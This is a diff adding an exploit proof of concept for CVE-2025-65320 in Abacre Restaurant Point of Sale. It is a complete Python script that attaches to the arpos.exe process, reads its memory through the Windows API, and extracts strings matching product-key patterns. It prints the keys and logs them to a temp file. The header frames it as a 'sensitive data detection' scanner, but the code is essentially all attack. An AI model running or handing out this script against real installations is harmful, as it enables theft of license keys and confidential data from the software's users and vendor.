@@ -1,0 +1,227 @@
+=============================================================================================================================================
+| # Title     : Abacre Restaurant Point of Sale 15.0.0.1656 Memory Scanner for Sensitive Data Detection                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.abacre.com/restaurantpos/                                                                                       |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212149/ & 	CVE-2025-65320
+
+[+] Summary : This Python script is an advanced Windows memory scanning tool designed to detect sensitive data leaks within running processes. 
+              It performs deep memory analysis to identify patterns resembling product keys, serial numbers, and other confidential information
+
+
+[+]  POC : python poc.py
+
+import ctypes
+import re
+import os
+import struct
+import time 
+
+# --- الثوابت (Constants) ---
+MEM_COMMIT = 0x1000
+PAGE_NOACCESS = 0x01
+PAGE_GUARD = 0x100
+MAX_REGION_SIZE = 5 * 1024 * 1024 # 5 MB
+PROCESS_QUERY_INFORMATION = 0x0400
+PROCESS_VM_READ = 0x0010
+
+# --- تعريف هياكل Windows API (Structure Definitions) ---
+class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ("BaseAddress", ctypes.c_ulonglong),
+        ("AllocationBase", ctypes.c_ulonglong),
+        ("AllocationProtect", ctypes.c_ulong),
+        ("RegionSize", ctypes.c_ulonglong),
+        ("State", ctypes.c_ulong),
+        ("Protect", ctypes.c_ulong),
+        ("Type", ctypes.c_ulong),
+    ]
+
+# --- تعريف دوال Windows API (Function Prototypes) ---
+# سطر التصحيح هنا: تم تغيير use_last_last_error إلى use_last_error
+kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+
+kernel32.OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_int, ctypes.c_ulong]
+kernel32.OpenProcess.restype = ctypes.c_void_p
+
+kernel32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_ulong]
+kernel32.VirtualQueryEx.restype = ctypes.c_size_t
+
+kernel32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+kernel32.ReadProcessMemory.restype = ctypes.c_int
+
+kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
+kernel32.CloseHandle.restype = ctypes.c_int
+
+
+# --- الدالة الرئيسية (Main Scanning Function) ---
+def scan_windows(target_process_name, patterns):
+    
+    log_file = os.path.join(os.environ['TEMP'], 'memory_scan_log_python.txt')
+    # لا داعي لحذف الملف هنا، يمكننا الاعتماد على 'a' (append)
+
+    def log(message):
+        # نستخدم errors='ignore' لضمان عدم توقف التسجيل بسبب مشاكل الترميز
+        with open(log_file, 'a', encoding='latin-1', errors='ignore') as f: 
+            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n") 
+
+    print("🔍 Windows advanced memory scanning initiated (Python).\n")
+
+    # 1. الحصول على PID (باستخدام أمر Tasklist)
+    pid = None
+    try:
+        output = os.popen(f"tasklist /FI \"IMAGENAME eq {target_process_name}\" /NH").read()
+        match = re.search(r"\s+(\d+)", output)
+        if match:
+            pid = int(match.group(1))
+    except Exception:
+        pass
+
+    if not pid:
+        print(f"[-] Process '{target_process_name}' not found.")
+        return []
+
+    print(f"[+] Found PID: {pid}")
+
+    # 2. فتح العملية
+    hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid)
+    all_results = []
+    
+    # تحويل جميع أنماط السلسلة إلى أنماط بايت جاهزة
+    compiled_patterns = [(p, re.compile(p.encode('latin-1'))) for p in patterns]
+
+    if not hProcess:
+        error = kernel32.GetLastError()
+        print(f"❌ FATAL: Could not open process (Error Code: {error}). Run as Administrator.")
+        return []
+
+    print("[+] Attached to process memory. Starting scan.")
+    print(f"[+] Check log file location: {log_file}")
+    log("--- Scan Initiated ---")
+
+    # 3. حلقة فحص الذاكرة
+    address = 0x10000
+    max_address = 0x7FFFFFFFFFFF
+    totalRegionsScanned = 0
+
+    while address < max_address:
+        
+        mbi = MEMORY_BASIC_INFORMATION()
+        
+        result = kernel32.VirtualQueryEx(
+            hProcess,
+            ctypes.c_void_p(address),
+            ctypes.byref(mbi),
+            ctypes.sizeof(mbi)
+        )
+        
+        if result == 0:
+            error = kernel32.GetLastError()
+            if error != 18:
+                log(f"⚠️ VQEx Failed at 0x{address:X} (Error: {error}). Breaking loop.")
+            break
+
+        totalRegionsScanned += 1
+        
+        base_address = mbi.BaseAddress
+        region_size = mbi.RegionSize
+
+        # 4. تصفية المناطق
+        is_committed = mbi.State == MEM_COMMIT
+        is_readable = not (mbi.Protect & PAGE_NOACCESS or mbi.Protect & PAGE_GUARD)
+
+        if not is_committed or not is_readable or region_size > MAX_REGION_SIZE:
+            address = base_address + region_size
+            continue
+
+        # 5. القراءة والبحث
+        read_size = min(region_size, MAX_REGION_SIZE)
+        buffer = ctypes.create_string_buffer(read_size)
+        bytesRead = ctypes.c_size_t(0)
+
+        ok = kernel32.ReadProcessMemory(
+            hProcess,
+            ctypes.c_void_p(base_address),
+            buffer,
+            read_size,
+            ctypes.byref(bytesRead)
+        )
+
+        if not ok:
+            address = base_address + region_size
+            continue
+
+        if bytesRead.value > 0:
+            chunk = buffer.raw[:bytesRead.value]
+            
+            # البحث باستخدام جميع الأنماط
+            for original_pattern, compiled_pattern in compiled_patterns:
+                for match in compiled_pattern.finditer(chunk):
+                    offset = match.start()
+                    found_address = base_address + offset 
+                    
+                    # نستخدم errors='ignore' هنا لضمان عدم توقف البرنامج
+                    decoded_match = match.group(0).decode('latin-1', errors='ignore')
+                    
+                    log(f"✅ Match found for Pattern: {original_pattern} -> Result: {decoded_match} at 0x{found_address:X}")
+                    
+                    all_results.append({
+                        'pattern': original_pattern,
+                        'key_raw_bytes': match.group(0),
+                        'full_address': f"{found_address:X}",
+                        'protect': f"{mbi.Protect:X}",
+                    })
+
+        # الانتقال إلى العنوان التالي
+        address = base_address + region_size
+        
+    # 6. إغلاق المقبض
+    kernel32.CloseHandle(hProcess)
+    print(f"\n[+] Process handle closed safely. Total regions scanned: {totalRegionsScanned}")
+
+    return all_results
+
+# ------------------------------------
+# نقطة البداية (Main Execution)
+# ------------------------------------
+target_process = "arpos.exe"
+
+# النمط الوحيد الأكثر احتمالية (ASCII/Latin-1)
+search_patterns = [
+    # نمط ASCII/Latin-1 الموسع: 4 مقاطع من 5 أحرف تفصلها (شرطة أو نقطة أو بايت صفري)
+    r"[\w]{5}[\.\-\x00] ?[\w]{5}[\.\-\x00] ?[\w]{5}[\.\-\x00] ?[\w]{5}",
+]
+
+found_keys = scan_windows(target_process, search_patterns)
+
+print("\n--- Analysis Summary ---")
+
+if found_keys:
+    print(f"🎉 FOUND SENSITIVE DATA ({len(found_keys)} match(es))")
+    print("-------------------------")
+    
+    for index, result in enumerate(found_keys):
+        
+        # معالجة فك الترميز والتنظيف
+        try:
+            decoded_key = result['key_raw_bytes'].decode('latin-1', errors='ignore')
+            # إزالة البايتات الصفرية والمسافات
+            cleaned_key = decoded_key.replace('\x00', '').strip()
+        except Exception as e:
+            cleaned_key = f"DECODING FAILED (Error: {e})"
+        
+        print(f"MATCH {index + 1}:")
+        print(f"  📝 Pattern Used: {result['pattern']}")
+        print(f"  🔑 Key (Cleaned): {cleaned_key}") 
+        print(f"  📍 Address: 0x{result['full_address']}")
+        print(f"  🛡️ Protection: 0x{result['protect']}")
+        print("-------------------------")
+else:
+    print("[-] NO SENSITIVE DATA LEAK DETECTED.")
+	
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
